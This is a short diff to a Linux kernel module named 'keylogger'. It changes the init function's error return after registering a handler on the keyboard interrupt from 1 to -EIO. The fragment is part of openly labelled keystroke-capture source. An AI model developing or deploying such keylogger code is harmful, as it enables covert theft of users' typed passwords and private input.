@@ -109,7 +109,7 @@ static int		__init keylogger_init(void)
 	if (request_irq(KBD_IRQ, kbd_irq_handler, IRQF_SHARED, "keylogger", (void *)kbd_irq_handler))
 	{
 		printk(KERN_INFO "something went wrong in request_irq\n");
-		return 1;
+		return -EIO;
 	}
 	printk(KERN_INFO "keylogger: kbd_buffer -> [%d]\n", kbd_buffer);
 
